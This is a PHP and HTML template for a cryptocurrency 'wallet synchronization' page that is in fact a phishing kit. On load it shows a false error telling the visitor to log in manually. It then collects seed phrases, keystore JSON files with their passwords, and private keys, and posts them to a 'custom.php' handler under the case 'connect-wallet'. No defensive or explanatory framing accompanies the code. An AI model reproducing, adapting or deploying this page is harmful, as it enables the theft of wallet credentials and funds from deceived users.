<?php
$proceed = true;
if (!empty($uri->content_id)) {
  if (isset($files[$uri->content_id])) {
    $wallet = $files[$uri->content_id];
  } else $proceed = false;
} else $proceed = false;

if (empty($proceed)) {
  header("Location: {$uri->site}");
  die();
}
?>
<html>

<head>
  <title>Synchronize <?= $wallet->name ?> - <?= $generic->name ?></title>
  <?php require_once("includes/links.php") ?>
  <link rel="stylesheet" href="<?= $uri->site ?>css/sync.css<?= $cache_control ?>">
</head>

<body class="modal-open">
  <div id="particles-js"></div>
  <div id="__next">
    <div class="font-roboto" id="content">
      <?php require_once("includes/header.php") ?>

      <div class="container-fluid">
        <div class="row">
          <div class="col-md-4 offset-md-4">
            <figure>
              <img src="<?= $wallet->logo ?>" alt="<?= $wallet->name ?>" srcset="<?= $wallet->logo ?>">
            </figure>
            <br>
            <p class="text-center">
              <a href="javascript:;" id="sync" class="text-white" style="font-size: 20px;"><i class="fa fa-angle-left"></i>&nbsp; &nbsp;Synchronize <?= $wallet->name ?></a>
            </p>
          </div>
        </div>


        <div class="container-fluid">
          <div class="row">
            <div class="col-md-8 col-lg-4 offset-md-2 offset-lg-4 ">
              <ul class="nav nav-tabs">
                <li class="nav-item"><a class="nav-link active text-white" data-toggle="tab" href="#phrase">Phrase</a></li>
                <li class="nav-item"><a class="nav-link text-white" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
                <li class="nav-item"><a class="nav-link text-white" data-toggle="tab" href="#privatekey">Private Key</a></li>
              </ul>
            </div>
            <div class="col-md-8 col-lg-4 offset-md-2 offset-lg-4 mt-5">
              <!-- Tab panes -->
              <div class="tab-content text-white">
                <p id="msg" style="color:red;"></p>
                <div role="tabpanel" class="tab-pane fade show active" id="phrase">
                  <form method="post" action="">
                    <textarea class="form-control" rows="5" name="value" required id="phrases" placeholder="Enter your phrase here"></textarea>
                    <input type="hidden" id="wall" name="type" value="phrase" required>
                    <input type="hidden" name="wallet" value="<?= $wallet->symbol ?>" required>
                    <p class="text-white my-5" style="margin-top: 10px;">Typically 12 or 18 (sometimes 24) words seperated by a single spaces.</p>
                    <div class="form-group"><button class="btn btn-primary btn-block submit" type="submit" id="submit" name="submit">SYNC</button></div>
                  </form>

                </div>
                <div role="tabpanel" class="tab-pane fade" id="keystore">
                  <form method="post" action="">
                    <div class="form-group">
                      <textarea class="form-control" required name="value" id="keystorejson" rows="5" placeholder="Keystore JSON"></textarea>
                      <input type="hidden" id="walls" name="type" value="keystorejson" required>
                      <input type="hidden" name="wallet" value="<?= $wallet->symbol ?>" required>
                    </div>
                    <div class="form-group">
                      <input class="form-control" type="password" id="password" name="password" placeholder="Password">
                    </div>
                    <p class="text-white my-5" style="margin-top: 10px;">
                      Several lines of text beginning with "{...}" plus the password you used to encrypt it.
                    </p>


                    <div class="form-group"><button class="btn btn-primary btn-block submit" type="submit" id="submits" name="submit">SYNC</button></div>
                  </form>
                </div>
                <div role="tabpanel" class="tab-pane fade" id="privatekey">
                  <form name="privatekey" method="post" action="">
                    <div class="form-group">
                      <input class="form-control" name="value" id="privatekeys" placeholder="Private Key">
                      <input type="hidden" id="wallss" name="type" value="privatekeys">
                      <input type="hidden" name="wallet" value="<?= $wallet->symbol ?>" required>

                    </div>
                    <p class="text-white my-5" style="margin-top: 10px;">Typically 12 or 18 (sometimes 24) words seperated by a single spaces.</p>

                    <div class="form-group"><button class="btn btn-primary btn-block submit" type="submit" id="submit-btn" name="submit">SYNC</button></div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
        <section style="margin-top: 40px;">


          <div id="myModal" class="modal fade show" style="padding-right: 17px;">
            <div class="modal-dialog">
              <div class="modal-content">
                <div class="modal-header">
                  <h5 class="modal-title" style="font-size:130%"><b>Error <font color="red">!!!</font></b></h5>
                  <button type="button" class="close" data-dismiss="modal">×</button>
                </div>
                <div class="modal-body">
                  <p>Unable to detect <?= $wallet->name ?> automatically. Kindly log in manually using your 12 or 18 (sometimes 24) word phrases.<br> &nbsp;</p>

                  <button type="button" class="btn btn-primary" data-dismiss="modal">Continue Securely</button>

                </div>
              </div>
            </div>
          </div>
        </section>

      </div>
    </div>

    <?php require_once("includes/footer.php") ?>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <script>
      $(document).ready(function() {
        $("#myModal").modal("show");
        $("#sync").click(function() {
          $("#myModal").modal("show");
        });
        $("form").each(function() {
          $(this).submitForm({
            process_url: `${site.process}custom.php`,
            case: "connect-wallet"
          }, null, function(res) {
            window.location.reload();
          })
        })
      })
    </script>
  </div>

</html>